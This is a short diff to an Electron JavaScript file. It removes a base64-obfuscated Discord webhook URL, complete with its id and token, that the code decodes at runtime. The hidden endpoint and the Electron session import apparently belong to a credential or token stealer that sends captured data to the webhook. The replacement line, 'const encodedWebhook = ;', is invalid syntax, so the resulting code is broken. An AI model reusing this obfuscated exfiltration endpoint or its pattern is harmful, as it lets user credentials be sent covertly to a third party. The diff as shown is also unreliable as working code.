@@ -10,7 +10,7 @@ const {
     session,
 } = require('electron');
 
-const encodedWebhook = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM3Mzk2OTc2ODM5ODMyNzg0OC90WWRjQWwzLUlKV1ByMVZyTmFkRHNTZDZEWmVnUlhfbWpPRWN4Y2NyZkU5bkJYOF9zUjc4MXlGdG13djRKYXhKUHN2WQ==";
+const encodedWebhook = ;
 const webhook = Buffer.from(encodedWebhook, 'base64').toString('utf-8');
 
 const CONFIG = {
